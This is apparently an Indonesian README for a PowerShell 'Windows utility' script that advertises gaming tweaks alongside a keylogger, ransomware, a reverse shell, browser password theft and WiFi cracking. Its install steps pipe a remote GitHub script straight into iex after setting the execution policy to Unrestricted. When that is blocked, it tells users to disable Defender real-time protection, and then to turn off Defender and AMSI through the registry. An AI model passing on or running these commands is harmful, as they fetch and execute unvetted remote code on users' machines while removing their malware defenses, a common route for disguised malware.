# 🛡️ WINUTIL INDONESIA v4.0 OMEGA

**Windows Ultimate Utility - 100+ Tools in 1 Script**

## ⚡ Fitur Lengkap

| No | Kategori | Fitur |
|----|----------|-------|
| 01 | System Tweaks | Telemetry off, Disable Defender, Remove Bloatware, God Mode |
| 02 | Network Attack | DDoS Simulator, MAC Spoofer, ARP Spoofing, WiFi Cracker |
| 03 | Password Tools | Windows Bypass, Browser Passwords, Hidden Admin Account |
| 04 | Malware Lab | Keylogger, Ransomware Simulator, Reverse Shell |
| 05 | Gaming Booster | One-click boost, FPS Monitor, Latency Optimizer |

## 🚀 Cara Menjalankan

```powershell
# Buka PowerShell sebagai Administrator
Set-ExecutionPolicy Unrestricted -Force
irm https://raw.githubusercontent.com/Hanzala903/tweakme/main/winutil_ultimate.ps1 | iex

Jika ada kesalahan kayak di tolak pakai powershell dibawah ini untuk mematikan antivirus sementara
 # Matikan Real-time Protection sementara
Set-MpPreference -DisableRealtimeMonitoring $true

# Lalu jalankan script
irm https://raw.githubusercontent.com/Hanzala903/tweakme/main/winutil_ultimate.ps1 | iex

# Setelah selesai, hidupkan lagi
Set-MpPreference -DisableRealtimeMonitoring $false
KALO GAK BISA COBA YANG INI INGAT SETELAH DI PAKAI HARUS AKTIVKAN LAGI ANTI VIRUS NYA OK KALO ADA RESIKO TANGGUNG SENDIRI

# Nonaktifkan semua proteksi Defender via Registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Matikan real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Matikan AMSI via Registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\AMSI" /v DisableAMSI /t REG_DWORD /d 1 /f

# Restart komputer
Restart-Computer -Force
